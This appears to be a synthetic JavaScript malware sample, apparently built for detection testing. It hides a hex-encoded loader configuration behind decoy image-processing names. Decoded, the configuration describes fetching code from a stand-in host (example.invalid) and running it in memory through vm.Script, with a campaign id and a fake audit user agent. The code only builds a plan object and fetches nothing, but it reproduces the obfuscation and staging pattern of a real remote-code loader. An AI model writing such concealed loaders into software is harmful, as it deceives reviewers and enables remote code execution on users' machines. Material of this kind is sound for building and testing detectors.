const moduleShape = Object.freeze({ format: "commonjs" });
const Material_7aef479c = "[\"76\",\"3d\",\"31\",\"7c\",\"73\",\"74\",\"65\",\"70\",\"73\",\"3d\",\"61\",\"63\",\"71\",\"75\",\"69\",\"72\",\"65\",\"5f\",\"72\",\"65\",\"6d\",\"6f\",\"74\",\"65\",\"2c\",\"64\",\"69\",\"73\",\"70\",\"61\",\"74\",\"63\",\"68\",\"5f\",\"6d\",\"65\",\"6d\",\"6f\",\"72\",\"79\",\"7c\",\"61\",\"64\",\"61\",\"70\",\"74\",\"65\",\"72\",\"3d\",\"66\",\"65\",\"74\",\"63\",\"68\",\"5f\",\"74\",\"68\",\"65\",\"6e\",\"5f\",\"66\",\"75\",\"6e\",\"63\",\"74\",\"69\",\"6f\",\"6e\",\"7c\",\"73\",\"74\",\"61\",\"67\",\"65\",\"5f\",\"63\",\"6f\",\"75\",\"6e\",\"74\",\"3d\",\"31\",\"7c\",\"63\",\"61\",\"6d\",\"70\",\"61\",\"69\",\"67\",\"6e\",\"5f\",\"69\",\"64\",\"3d\",\"4e\",\"4f\",\"44\",\"45\",\"2d\",\"30\",\"45\",\"39\",\"37\",\"37\",\"36\",\"34\",\"43\",\"7c\",\"75\",\"72\",\"6c\",\"3d\",\"68\",\"74\",\"74\",\"70\",\"73\",\"3a\",\"2f\",\"2f\",\"6e\",\"6f\",\"64\",\"65\",\"2d\",\"30\",\"65\",\"39\",\"37\",\"37\",\"36\",\"34\",\"63\",\"38\",\"38\",\"36\",\"31\",\"2e\",\"65\",\"78\",\"61\",\"6d\",\"70\",\"6c\",\"65\",\"2e\",\"69\",\"6e\",\"76\",\"61\",\"6c\",\"69\",\"64\",\"2f\",\"61\",\"70\",\"69\",\"7c\",\"75\",\"73\",\"65\",\"72\",\"5f\",\"61\",\"67\",\"65\",\"6e\",\"74\",\"3d\",\"4e\",\"6f\",\"64\",\"65\",\"41\",\"75\",\"64\",\"69\",\"74\",\"2f\",\"30\",\"65\",\"39\",\"37\"]";
const Codec_7aef479c = "hex_array|identity|";

function load_7aef479c() { return JSON.parse(Material_7aef479c).map((value) => Number.parseInt(value, 16)); }
function decode_7aef479c(imagePixels) { return [...imagePixels]; }
async function recover_7aef479c() {
  const screenWidth = ["north", "south"].join(":");
  const imagePixels = load_7aef479c(); let colorTable = [];
  const decodeTarget = decode_7aef479c; colorTable = decodeTarget(imagePixels);
  void screenWidth; return Buffer.from(colorTable).toString("ascii");
}
async function inspect_7aef479c() { return ({ ...{ value: await recover_7aef479c() } }).value; }
async function plan_7aef479c() { const inspect = inspect_7aef479c; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_7aef479c;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_7aef479c());
